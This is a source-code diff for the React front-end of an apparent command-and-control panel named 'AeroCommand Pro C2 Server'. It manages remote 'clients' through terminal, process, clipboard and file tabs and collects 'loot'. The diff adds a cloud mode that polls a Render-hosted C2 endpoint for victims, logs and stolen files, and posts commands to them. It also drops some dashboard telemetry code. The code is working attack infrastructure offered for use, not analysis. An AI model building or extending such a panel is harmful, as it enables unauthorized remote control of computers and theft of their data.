@@ -3,7 +3,7 @@ import {
   LayoutDashboard, Monitor, Terminal as TermIcon, FolderOpen, 
   Clipboard, Database, Settings, Play, Square, RefreshCw, Send, ShieldCheck, Cpu, HardDrive,
   Image as ImageIcon, FileText, FileCode, Archive, File as FileGeneric, Eye, X, ZoomIn, ZoomOut, Download, Copy, Check,
-  Search, ArrowUpRight, TrendingUp, ChevronDown, Zap
+  Search, ArrowUpRight, TrendingUp, ChevronDown
 } from 'lucide-react';
 import { invoke } from '@tauri-apps/api/core';
 
@@ -95,25 +95,17 @@ const Tooltip = ({ children, text, position = 'top' }: { children: React.ReactNo
 
 export default function App() {
   const [activeTab, setActiveTab] = useState<'dashboard' | 'endpoints' | 'terminal' | 'files' | 'processes' | 'clipboard' | 'database' | 'settings'>('dashboard');
-  const [uptime, setUptime] = useState('0:00:00');
-  const [startTime] = useState(Date.now());
   const [serverRunning, setServerRunning] = useState(true);
-  const [serverPort, setServerPort] = useState('9540');
+  const [serverPort] = useState('9540');
   
-  // Dashboard Metrics & Graphs
-  const [cpuUsage, setCpuUsage] = useState(0);
-  const [ramUsage, setRamUsage] = useState(0);
-  const [netUsage, setNetUsage] = useState(0);
-  const [diskUsage, setDiskUsage] = useState(0);
-  const [cpuHistory, setCpuHistory] = useState<number[]>(new Array(20).fill(0));
-  const [ramHistory, setRamHistory] = useState<number[]>(new Array(20).fill(0));
-  const [netHistory, setNetHistory] = useState<number[]>(new Array(20).fill(0));
-  const [diskHistory, setDiskHistory] = useState<number[]>(new Array(20).fill(0));
-
+  // Cloud C2 Server Sync State
+  const [c2ServerUrl, setC2ServerUrl] = useState<string>(() => localStorage.getItem('c2_server_url') || 'https://your-c2-service.onrender.com');
+  const [c2Mode, setC2Mode] = useState<'cloud' | 'local'>(() => (localStorage.getItem('c2_mode') as any) || 'cloud');
+  const [c2ConnectionStatus, setC2ConnectionStatus] = useState<'connected' | 'connecting' | 'error'>('connecting');
+  
   // Real State from Backend
   const [clients, setClients] = useState<Client[]>([]);
   const [logs, setLogs] = useState<CommandLog[]>([]);
-  const [printedLogIds, setPrintedLogIds] = useState<Set<number>>(new Set());
   const [selectedClientId, setSelectedClientId] = useState<string>('');
   const [activityFilter, setActivityFilter] = useState<'all' | 'files' | 'processes' | 'commands'>('all');
   
@@ -153,8 +145,8 @@ export default function App() {
   // Terminal State
   const [termInput, setTermInput] = useState('');
   const [termLogs, setTermLogs] = useState<string[]>([
-    "[+] AeroCommand Pro C2 Server v3.5 initialized",
-    "[+] Listening on port 9540...",
+    "[+] AeroCommand Pro C2 Server initialized",
+    "[+] Cloud Remote Sync ready",
   ]);
   const [suggestions, setSuggestions] = useState<string[]>([]);
   const quickCommands = [
@@ -197,13 +189,41 @@ export default function App() {
     const pollInterval = (activeTab === 'files' && isFilesLoading) ? 1000 : 2000;
     const fetchData = async () => {
       try {
-        const backendClients = await invoke<Client[]>('get_clients');
-        const backendLogs = await invoke<CommandLog[]>('get_logs');
+        let backendClients: Client[] = [];
+        let backendLogs: CommandLog[] = [];
+
+        if (c2Mode === 'cloud' && c2ServerUrl) {
+          const cleanUrl = c2ServerUrl.replace(/\/+$/, '');
+          try {
+            const clientsRes = await fetch(`${cleanUrl}/api/clients`);
+            if (clientsRes.ok) {
+              backendClients = await clientsRes.json();
+              setC2ConnectionStatus('connected');
+            }
+          } catch (e) {
+            setC2ConnectionStatus('error');
+          }
+
+          try {
+            const logsRes = await fetch(`${cleanUrl}/api/logs`);
+            if (logsRes.ok) {
+              backendLogs = await logsRes.json();
+            }
+          } catch (e) {}
+        } else {
+          try {
+            backendClients = await invoke<Client[]>('get_clients');
+            backendLogs = await invoke<CommandLog[]>('get_logs');
+            setC2ConnectionStatus('connected');
+          } catch (e) {
+            setC2ConnectionStatus('error');
+          }
+        }
+
         setClients(backendClients);
         
         const terminalUpdates: string[] = [];
         const currentPrintedIds = printedIdsRef.current;
-        let hasNewPrinted = false;
 
         backendLogs.forEach(log => {
           if (log.status === 'SUCCESS' && !currentPrintedIds.has(log.id)) {
@@ -254,16 +274,11 @@ export default function App() {
             }
 
             currentPrintedIds.add(log.id);
-            hasNewPrinted = true;
           }
         });
 
         if (terminalUpdates.length > 0) {
           setTermLogs(prev => [...prev, ...terminalUpdates]);
-        }
-        
-        if (hasNewPrinted) {
-          setPrintedLogIds(new Set(currentPrintedIds));
         }
 
         setLogs(backendLogs);
@@ -271,8 +286,18 @@ export default function App() {
         
         // Fetch loot if on files tab
         if (activeTab === 'files') {
-          const loot = await invoke<LootFile[]>('get_loot');
-          setLootFiles(loot);
+          if (c2Mode === 'cloud' && c2ServerUrl) {
+            const cleanUrl = c2ServerUrl.replace(/\/+$/, '');
+            try {
+              const lootRes = await fetch(`${cleanUrl}/api/loot`);
+              if (lootRes.ok) {
+                setLootFiles(await lootRes.json());
+              }
+            } catch (e) {}
+          } else {
+            const loot = await invoke<LootFile[]>('get_loot');
+            setLootFiles(loot);
+          }
         }
       } catch (err) {
         console.error("Failed to fetch data from backend", err);
@@ -281,7 +306,7 @@ export default function App() {
 
     const interval = setInterval(fetchData, pollInterval);
     return () => clearInterval(interval);
-  }, [activeTab, isFilesLoading]);
+  }, [activeTab, isFilesLoading, c2Mode, c2ServerUrl]);
 
   // Tab Initialization Logic
   useEffect(() => {
@@ -683,37 +708,6 @@ export default function App() {
     }
   };
 
-  // Uptime & Resource Ticker
-  useEffect(() => {
-    const timer = setInterval(() => {
-      const diff = Math.floor((Date.now() - startTime) / 1000);
-      const hrs = Math.floor(diff / 3600);
-      const mins = Math.floor((diff % 3600) / 60);
-      const secs = diff % 60;
-      setUptime(`${hrs}:${mins < 10 ? '0' : ''}${mins}:${secs < 10 ? '0' : ''}${secs}`);
-
-      // Use real telemetry from the first active client if available
-      // In a real scenario, you might want to track which client is selected
-      const activeClient = clients.length > 0 ? clients[0] : null;
-      
-      const newCpu = activeClient ? activeClient.cpu_usage : 0;
-      const newRam = activeClient ? activeClient.ram_usage : 0;
-      const newNet = activeClient ? activeClient.net_usage : 0;
-      const newDisk = activeClient ? activeClient.disk_usage : 0;
-      
-      setCpuUsage(newCpu);
-      setRamUsage(newRam);
-      setNetUsage(newNet);
-      setDiskUsage(newDisk);
-
-      setCpuHistory(prev => [...prev.slice(1), newCpu]);
-      setRamHistory(prev => [...prev.slice(1), newRam]);
-      setNetHistory(prev => [...prev.slice(1), newNet]);
-      setDiskHistory(prev => [...prev.slice(1), newDisk]);
-    }, 1000);
-    return () => clearInterval(timer);
-  }, [startTime, clients]);
-
   // Autocomplete handling
   const handleInputChange = (val: string) => {
     setTermInput(val);
@@ -738,9 +732,27 @@ export default function App() {
     }
     
     try {
-      await invoke('send_command', { clientId: targetId, command: cmd });
-      if (!silent) {
-        setTermLogs(prev => [...prev, `[+] Command queued for ${targetId}`]);
+      if (c2Mode === 'cloud' && c2ServerUrl) {
+        const cleanUrl = c2ServerUrl.replace(/\/+$/, '');
+        const res = await fetch(`${cleanUrl}/api/send_command`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ client_id: targetId, command: cmd }),
+        });
+        if (res.ok) {
+          if (!silent) {
+            setTermLogs(prev => [...prev, `[+] Command queued via Cloud C2 for ${targetId}`]);
+          }
+        } else {
+          if (!silent) {
+            setTermLogs(prev => [...prev, `[-] Cloud C2 error: ${res.statusText}`]);
+          }
+        }
+      } else {
+        await invoke('send_command', { clientId: targetId, command: cmd });
+        if (!silent) {
+          setTermLogs(prev => [...prev, `[+] Command queued for ${targetId}`]);
+        }
       }
     } catch (err) {
       if (!silent) {
@@ -806,15 +818,21 @@ export default function App() {
         {/* Footer Listener Status */}
         <div className="p-2.5 bg-c2card border border-c2border rounded-lg">
           <div className="flex items-center justify-between text-xs text-slate-300 mb-1">
-            <span className="text-[11px] font-semibold">Listener Status</span>
-            <span className="flex items-center text-emerald-400 text-[10px] font-bold">
-              <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 mr-1.5 animate-pulse"></span>
-              ACTIVE
+            <span className="text-[11px] font-semibold">C2 Network</span>
+            <span className={`flex items-center text-[10px] font-bold ${
+              c2ConnectionStatus === 'connected' ? 'text-emerald-400' : 'text-amber-400'
+            }`}>
+              <span className={`h-1.5 w-1.5 rounded-full mr-1.5 ${
+                c2ConnectionStatus === 'connected' ? 'bg-emerald-400 animate-pulse' : 'bg-amber-400'
+              }`}></span>
+              {c2Mode === 'cloud' ? 'RENDER CLOUD' : 'LOCAL'}
             </span>
           </div>
           <div className="text-[10px] text-slate-400 font-mono flex items-center justify-between mt-1">
-            <span>Port: {serverPort}</span>
-            <span>{clients.length} Client{clients.length === 1 ? '' : 's'}</span>
+            <span className="truncate max-w-[110px]" title={c2Mode === 'cloud' ? c2ServerUrl : `Port ${serverPort}`}>
+              {c2Mode === 'cloud' ? 'onrender.com' : `Port ${serverPort}`}
+            </span>
+            <span className="text-c2cyan font-bold">{clients.length} Client{clients.length === 1 ? '' : 's'}</span>
           </div>
         </div>
       </div>
@@ -1756,7 +1774,7 @@ export default function App() {
                     />
                   </div>
                   <button 
-                    onClick={fetchProcesses}
+                    onClick={() => fetchProcesses()}
                     disabled={isProcessesLoading}
                     className="flex items-center space-x-2 px-3 py-1.5 bg-slate-800 hover:bg-slate-700 rounded-lg text-xs font-bold transition-colors border border-c2border disabled:opacity-50"
                   >
@@ -1894,7 +1912,7 @@ export default function App() {
                     </div>
                   ) : (
                     <div className="divide-y divide-c2border">
-                      {clipEntries.map((entry, i) => (
+                      {clipEntries.map((entry) => (
                         <div key={entry.id} className="p-3.5 hover:bg-c2pill/40 transition-colors group">
                           <div className="flex items-start justify-between gap-3">
                             <div className="flex items-start space-x-2.5 min-w-0 flex-1">
@@ -1964,13 +1982,111 @@ export default function App() {
 
           {/* 7. SETTINGS VIEW */}
           {activeTab === 'settings' && (
-            <div className="space-y-6 max-w-xl">
-              <h2 className="text-lg font-bold">Server Configuration</h2>
-              <div className="bg-c2card border border-c2border p-6 rounded space-y-4">
+            <div className="space-y-5 max-w-2xl">
+              <div>
+                <h2 className="text-sm font-bold text-white uppercase tracking-wider">C2 Server Configuration</h2>
+                <p className="text-[11px] text-slate-400 mt-0.5">Manage your remote cloud C2 connection or switch to local standalone mode</p>
+              </div>
+
+              {/* Mode Selection Card */}
+              <div className="bg-c2card border border-c2border rounded-xl p-5 shadow-card space-y-4">
                 <div>
-                  <label className="block text-xs font-semibold text-slate-400 mb-1">C2 Server Port</label>
-                  <input type="text" value={serverPort} readOnly className="w-full bg-slate-900 border border-c2border rounded px-3 py-2 text-sm font-mono opacity-50" />
+                  <label className="text-xs font-bold text-white uppercase tracking-wider block mb-2">Connection Mode</label>
+                  <div className="grid grid-cols-2 gap-3">
+                    <button
+                      onClick={() => {
+                        setC2Mode('cloud');
+                        localStorage.setItem('c2_mode', 'cloud');
+                      }}
+                      className={`p-3.5 rounded-lg border text-left transition-all ${
+                        c2Mode === 'cloud'
+                          ? 'bg-[#1A2235] border-c2accent shadow-sm'
+                          : 'bg-c2pill/50 border-c2border hover:border-c2borderlight text-slate-400'
+                      }`}
+                    >
+                      <div className="flex items-center justify-between mb-1">
+                        <span className="text-xs font-bold text-white">☁️ Render Cloud Remote</span>
+                        {c2Mode === 'cloud' && (
+                          <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-c2accent text-white">ACTIVE</span>
+                        )}
+                      </div>
+                      <p className="text-[11px] text-slate-400">Connect to your live HTTPS server on Render to manage remote fleet anywhere.</p>
+                    </button>
+
+                    <button
+                      onClick={() => {
+                        setC2Mode('local');
+                        localStorage.setItem('c2_mode', 'local');
+                      }}
+                      className={`p-3.5 rounded-lg border text-left transition-all ${
+                        c2Mode === 'local'
+                          ? 'bg-[#1A2235] border-c2accent shadow-sm'
+                          : 'bg-c2pill/50 border-c2border hover:border-c2borderlight text-slate-400'
+                      }`}
+                    >
+                      <div className="flex items-center justify-between mb-1">
+                        <span className="text-xs font-bold text-white">💻 Local Standalone</span>
+                        {c2Mode === 'local' && (
+                          <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-c2accent text-white">ACTIVE</span>
+                        )}
+                      </div>
+                      <p className="text-[11px] text-slate-400">Run embedded C2 listener directly on your machine on port 443.</p>
+                    </button>
+                  </div>
                 </div>
+
+                {/* Cloud Server URL Configuration */}
+                {c2Mode === 'cloud' && (
+                  <div className="space-y-3 pt-3 border-t border-c2border/60">
+                    <div>
+                      <label className="block text-xs font-bold text-slate-300 mb-1.5">Render Cloud C2 Endpoint URL</label>
+                      <div className="flex items-center space-x-2">
+                        <input 
+                          type="text" 
+                          value={c2ServerUrl}
+                          onChange={(e) => setC2ServerUrl(e.target.value)}
+                          placeholder="https://your-c2-service.onrender.com"
+                          className="flex-1 bg-c2bg border border-c2border focus:border-c2accent rounded-md px-3 py-2 text-xs font-mono text-white outline-none transition-colors"
+                        />
+                        <button
+                          onClick={() => {
+                            localStorage.setItem('c2_server_url', c2ServerUrl.trim());
+                            alert('Server URL saved! Reconnecting...');
+                          }}
+                          className="px-3.5 py-2 bg-c2accent hover:bg-blue-600 text-white rounded-md text-xs font-bold transition-colors shadow-sm"
+                        >
+                          Save & Connect
+                        </button>
+                      </div>
+                    </div>
+
+                    <div className="flex items-center space-x-2 text-xs">
+                      <span className="text-slate-400">Connection Status:</span>
+                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold flex items-center space-x-1.5 ${
+                        c2ConnectionStatus === 'connected'
+                          ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20'
+                          : 'bg-rose-500/10 text-rose-400 border border-rose-500/20'
+                      }`}>
+                        <span className={`w-1.5 h-1.5 rounded-full ${c2ConnectionStatus === 'connected' ? 'bg-emerald-400 animate-pulse' : 'bg-rose-400'}`} />
+                        <span>{c2ConnectionStatus === 'connected' ? 'LIVE & SYNCHRONIZED' : 'DISCONNECTED / CHECK URL'}</span>
+                      </span>
+                    </div>
+                  </div>
+                )}
+
+                {/* Local Port Configuration */}
+                {c2Mode === 'local' && (
+                  <div className="pt-3 border-t border-c2border/60">
+                    <label className="block text-xs font-bold text-slate-300 mb-1">Local Listener Port</label>
+                    <input 
+                      type="text" 
+                      value={serverPort} 
+                      readOnly 
+                      className="w-full bg-c2bg border border-c2border rounded-md px-3 py-2 text-xs font-mono text-slate-400 opacity-60" 
+                    />
+                    <p className="text-[10px] text-slate-500 mt-1">Embedded listener binds to 0.0.0.0:443.</p>
+                  </div>
+                )}
               </div>
             </div>
           )}
